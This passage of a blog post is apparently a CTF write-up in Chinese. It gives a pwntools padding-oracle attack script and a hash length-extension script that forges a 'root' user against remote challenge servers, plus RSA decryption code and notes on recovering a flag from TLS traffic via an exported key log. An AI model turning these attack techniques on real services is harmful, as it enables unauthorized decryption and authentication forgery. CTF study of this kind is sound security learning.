class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ct = <span class="string">'4141414141414141414141414141414173f880342a533d069b3d2c33ea2c452aaac1cdf6ccb81e51f081a90ea411fe9edbd6bf6de7bab502dabdb9c51b7fb490'</span></span><br><span class="line">printable_chars = range(<span class="number">32</span>, <span class="number">128</span>) + range(<span class="number">5</span>,<span class="number">17</span>)</span><br><span class="line">padding_chars = range(<span class="number">1</span>, <span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(cipher, conn)</span>:</span></span><br><span class="line">    cipher = cipher.decode(<span class="string">'hex'</span>)</span><br><span class="line">    conn.send(<span class="string">'3\n'</span>)</span><br><span class="line">    conn.recv()</span><br><span class="line">    conn.send((<span class="string">'A'</span>*<span class="number">16</span>).encode(<span class="string">'base64'</span>))</span><br><span class="line"></span><br><span class="line">    conn.recv()</span><br><span class="line">    conn.send(cipher.encode(<span class="string">'base64'</span>))</span><br><span class="line">    <span class="keyword">if</span> conn.recv() == <span class="string">'Decrpytion Done\n'</span>:</span><br><span class="line">        conn.recv()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.recv()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2hex</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="string">'''整数转成十六进制，返回字符串形式，xx，这种方法要记下来放到日志'''</span></span><br><span class="line">    <span class="keyword">return</span> hex(i)[<span class="number">2</span>:] <span class="keyword">if</span> len(hex(i)[<span class="number">2</span>:]) == <span class="number">2</span> <span class="keyword">else</span> <span class="string">'0'</span> + hex(i)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exor_pad</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="string">'''输入一个1~16整数，返回一个长度16Byte，前导0，后面用i进行padding的字符串'''</span></span><br><span class="line">    <span class="keyword">assert</span>(i &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span>(i &lt;= <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span>  <span class="string">'00'</span> * (<span class="number">16</span> - i) + int2hex(i) * i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exor_g</span><span class="params">(g, pos)</span>:</span></span><br><span class="line">    <span class="string">'''输入guess值，还有需要异或的位置(0~15)，返回一个长度16的前导0、后缀0、中间某一Byte为guess值的字符串'''</span></span><br><span class="line">    <span class="keyword">assert</span>(pos &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span>(pos &lt; <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'00'</span> * (<span class="number">15</span> - pos) + int2hex(g) + <span class="string">'00'</span> * pos</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">refill_zero</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">'''填充前导0，返回长度32的字符串'''</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0'</span> * (<span class="number">32</span> - len(s)) + s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="string">'''xor two strings of different lengths'''</span></span><br><span class="line">    <span class="keyword">if</span> len(a) &gt; len(b):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(x) ^ ord(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(a[:len(b)], b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(x) ^ ord(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(a, b[:len(a)])])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexexor</span><span class="params">(s1, s2)</span>:</span></span><br><span class="line">    <span class="string">'''输入的是两个字符串，输出他们异或后的字符串'''</span></span><br><span class="line">    <span class="comment"># 先decode，将字符串转成Byte数据类型，再异或，异或结果后重新编码为字符串</span></span><br><span class="line">    <span class="keyword">return</span> strxor(s1.decode(<span class="string">"hex"</span>), s2.decode(<span class="string">"hex"</span>)).encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConSec</span><span class="params">()</span>:</span></span><br><span class="line">    conn = remote(<span class="string">'106.75.98.74'</span>,<span class="number">10010</span>)</span><br><span class="line">    cipher = <span class="string">"c/iANCpTPQabPSwz6ixFKqrBzfbMuB5R8IGpDqQR/p7b1r9t57q1Atq9ucUbf7SQ"</span>.decode(<span class="string">'base64'</span>)</span><br><span class="line">    <span class="keyword">print</span> conn.recv()</span><br><span class="line">    <span class="keyword">print</span> conn.recv()</span><br><span class="line">    <span class="keyword">return</span> conn</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_a_byte</span><span class="params">(conn, found_msg, pos, dictinary_, iv, ct, is_padding = False)</span>:</span></span><br><span class="line">    <span class="comment"># 功能：穷举一个字节，破解得到明文</span></span><br><span class="line">    <span class="comment"># 输入found_msg为之前已经找到的字符串</span></span><br><span class="line">    <span class="comment"># pos为需要穷举的字节位置：从后开始计数1~16</span></span><br><span class="line">    <span class="comment"># dicitionay为穷举字典：int型范围0~255</span></span><br><span class="line">    <span class="comment"># iv为需要进行异或的字符串，ct为待解密的密文</span></span><br><span class="line">    <span class="comment"># is_padding是检查密文的Padding有效性时候用到，默认false</span></span><br><span class="line">    pad = exor_pad(pos)</span><br><span class="line">    lastmsg = refill_zero(found_msg.encode(<span class="string">"hex"</span>))</span><br><span class="line">    getletter = <span class="keyword">False</span></span><br><span class="line">    possible_padding = []</span><br><span class="line">    <span class="comment"># 字典破解，我有两个字典：ascii字符和padding集合</span></span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> dictinary_:</span><br><span class="line">        gpad = exor_g(guess, pos - <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 是把猜想值和lastmsg做异或运算，能否破解成功依赖Lastmsg的正确性。</span></span><br><span class="line">        <span class="keyword">if</span> query(hexexor(lastmsg, hexexor(iv, hexexor(gpad, pad))) + ct, conn):</span><br><span class="line">            getletter = <span class="keyword">True</span></span><br><span class="line">            new_msg = int2hex(guess).decode(<span class="string">"hex"</span>) + found_msg</span><br><span class="line">            <span class="keyword">if</span> is_padding:</span><br><span class="line">                possible_padding.append(guess)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> new_msg</span><br><span class="line">    <span class="keyword">if</span> is_padding:</span><br><span class="line">        <span class="keyword">return</span> possible_padding</span><br><span class="line">    <span class="keyword">if</span> getletter == <span class="keyword">False</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    conn = getConSec()</span><br><span class="line">    blocks = ()   <span class="comment"># 含四个元素，每个元素是长度32的字符串，使用tuple的目的是“不可变”的特性</span></span><br><span class="line">    <span class="keyword">while</span> ct:</span><br><span class="line">        blocks = blocks + (ct[:<span class="number">32</span>],)</span><br><span class="line">        ct = ct[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">    b = input(<span class="string">"input block number to crack:\n#(1~3)"</span>)</span><br><span class="line">    iv = blocks[b - <span class="number">1</span>]   <span class="comment"># 截取待破解的前一个block作为IV，其他block都可以丢弃了</span></span><br><span class="line">    block = blocks[b]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 测试最后字节的Padding是否有效</span></span><br><span class="line">    is_last_block = <span class="keyword">False</span></span><br><span class="line">    <span class="comment"># if b == 3:</span></span><br><span class="line">    <span class="comment">#     is_last_block = True</span></span><br><span class="line">    <span class="keyword">if</span> is_last_block:</span><br><span class="line">        possible_paddings = test_a_byte(conn, <span class="string">''</span>, <span class="number">1</span>, padding_chars, iv, block, <span class="keyword">True</span>)</span><br><span class="line">        <span class="comment"># 测试经过第一轮筛选处理的padding是否有效</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> possible_paddings:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"possible padding size is:"</span>, i</span><br><span class="line">            msg = chr(i) * i</span><br><span class="line">            start_byte = i + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> test_a_byte(conn, msg, start_byte, printable_chars, iv, block) != <span class="keyword">None</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"good padding size is:"</span>, i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg = <span class="string">''</span></span><br><span class="line">        start_byte = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对选定的block进行16字节的逐个字节破解</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(start_byte, <span class="number">17</span>):</span><br><span class="line">        is_found = test_a_byte(conn, msg, pos, printable_chars, iv, block)</span><br><span class="line">        <span class="keyword">if</span> is_found:</span><br><span class="line">            msg = is_found</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"%r"</span> % msg</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"can't found the last #%d byte"</span> % pos</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> is_last_block <span class="keyword">and</span> msg:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"After cutting padding off, the last block is:\n%r"</span> % msg[:-(start_byte - <span class="number">1</span>)]</span><br></pre></td></tr></table></figure>
<h1 id="clemency"><a href="#clemency" class="headerlink" title="clemency"></a>clemency</h1><p>hitcon国内参赛选手提过的一个架构<br>9bit代替了8bit<br>在github找了个ida插件</p>
<p><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/64717057.jpg" alt=""></p>
<h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><ol>
<li>搜索flag关键字，发现在一个ftp包中含有flag.zip等字样</li>
</ol>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/75747794.jpg" alt=""></p>
<ol>
<li>过滤得到ftp完整通信流程将传输的zip文件导出，有密码的压缩包，里面是flag.txt</li>
</ol>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/13131227.jpg" alt=""></p>
<ol>
<li>通过ftp||ftp-data过滤将key.log导出</li>
</ol>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/2601669.jpg" alt=""></p>
<ol>
<li>导入key.log为ssl证书</li>
</ol>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/26430276.jpg" alt=""></p>
<ol>
<li>导入http对象</li>
</ol>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/17178874.jpg" alt=""></p>
<ol>
<li>打开后为压缩包含mp3，进行分析</li>
</ol>
<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/11020176.jpg" alt=""></p>
<p>用这个密码去解压压缩包得到flag  flag{4sun0_y0zora_sh0ka1h@}</p>
<h1 id="rrrsa"><a href="#rrrsa" class="headerlink" title="rrrsa"></a>rrrsa</h1><p>hash扩展攻击 ，让用户名里出现root，然后就可以再生成一对ed，同时能看到老的ed，如果两次e相同，那就相当于拿到d了，然后请求一次密文就ok</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConSec</span><span class="params">()</span>:</span></span><br><span class="line">    conn = remote(<span class="string">'106.75.98.74'</span>,<span class="number">10030</span>)</span><br><span class="line">    token = conn.recv()[<span class="number">-33</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    conn.recv()</span><br><span class="line">    <span class="keyword">return</span> conn,token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findSameE</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        conn, token = getConSec()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'start'</span></span><br><span class="line">        h = hashpumpy.hashpump(token, <span class="string">'guest'</span>, <span class="string">'root'</span>, <span class="number">8</span>)</span><br><span class="line">        conn.send(<span class="string">'1\n'</span>)</span><br><span class="line">        conn.recv()</span><br><span class="line">        conn.send(h[<span class="number">1</span>] + <span class="string">'\n'</span>)</span><br><span class="line">        conn.recv()</span><br><span class="line">        conn.send(h[<span class="number">0</span>] + <span class="string">'\n'</span>)</span><br><span class="line">        e = conn.recvline()</span><br><span class="line">        e = int(e[<span class="number">4</span>:])</span><br><span class="line">        d = conn.recvline()</span><br><span class="line">        d = int(d[<span class="number">4</span>:])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'e'</span>,e</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'d'</span>,d</span><br><span class="line">        conn.recv()</span><br><span class="line">        conn.recv()</span><br><span class="line"></span><br><span class="line">        conn.send(<span class="string">'2\n'</span>)</span><br><span class="line">        n = conn.recvline()</span><br><span class="line">        n = int(n[<span class="number">4</span>:])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'n'</span>, n</span><br><span class="line">        e2 = conn.recvline()</span><br><span class="line">        e2 = int(e2[<span class="number">4</span>:])</span><br><span class="line">        conn.recv()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'finish'</span></span><br><span class="line">        <span class="keyword">if</span> e2 == e:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'----------------```````````````````---------------------'</span></span><br><span class="line">            conn.send(<span class="string">'3\n'</span>)</span><br><span class="line">            f = conn.recv()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'f'</span> , f</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">return</span> f, e, d, n</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'not equal'</span></span><br><span class="line">            <span class="keyword">print</span> e2</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">            conn.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    flag_enc, e, d, n = findSameE()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'flag_enc :&gt;&gt;'</span>, flag_enc</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'e and d and n'</span>, e, d, n</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p>拿到数据后进行解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">f = <span class="number">14683015815664558563801576941259873798326690167651050048605500438701684408496420446210954963532410318389297642966435854745489938317707457853711466218044289065290845837536321014853684020186460366403221101008046326997159780567723107338094785513531848765406240418605856262554526167176997869744050412437697207716369805258141774488366641109964920618527096963297754238554764407150841812474020940377383920892323044658675143281286681485516457951570278828305838636179900402944417184295742821658797425171138893795809447102808748184072282008730049190002045912253021436715877710641309577427718880947231481979509491773821558495630</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">42557</span></span><br><span class="line">d = <span class="number">1405803797689753766121124816811438406635097169509938302560321650694887683763354544832446421618462783636223460691651260024139139681435555981044230096841532923821590682557001444031830233529733318151758359126991717193768181340465430448286701933168519305144478953071981857058771098824813044597941221483519691463328674245665508867881940139408259177240035345986021535415530440683317357792630367912626512879140394887502781711233045371334777186553583913805249735850457844171355581182981430494538414242574735347168419095760484924117877688500538899280429652142746708737501656061740113932258961396160464225966939430889959741717</span></span><br><span class="line">n = <span class="number">14713918400954955982493042014029607543327552937244083704392427075411297382665292514617418191051874245746867146250517135476460739651464081624520241080001258396231046403732983387521544330625888052283418713567975039010130962446184781994032753116048370897450465028500819451758514917040720299792076872275983155338383970086972864937471593525080347940764126191055849932929374654181884571725974013062466998817258204252680163981682275618928317547959032958679930767406984643684388270842181251832310744561071776712068724629196823024610536091642933627694285340404564988534606855524020291041210781629240781218089956911861804824793</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> long_to_bytes(pow(f,d,n))</span><br></pre></td></tr></table></figure>
<h1 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h1><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/11091834.jpg" alt=""></p>
</div></article></div></main><footer><div class="paginator"><a href="/2018/07/08/Firefox+burpsuite抓取https的正确姿势/" class="prev">上一篇</a><a href="/2018/07/08/一个alfred-npmjs小工具/" class="next">下一篇</a></div><div class="copyright"><p>© 2015 - 2018 <a href="https://www.ycjcl.cc">Kylin King</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>